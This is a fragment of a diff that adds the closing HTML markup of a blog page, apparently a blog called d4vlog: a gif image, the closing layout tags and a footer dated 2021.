+<p><img src="assets/hell-yes.gif" alt="hell-yes" width="200px" /></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="#">
+    <span>
+        <b>d4vlog</b>
+    </span>
+    
+    <span>© 2021</span>
+  </a>
+</footer>
+
+
+  
+</body>
+
+</html>
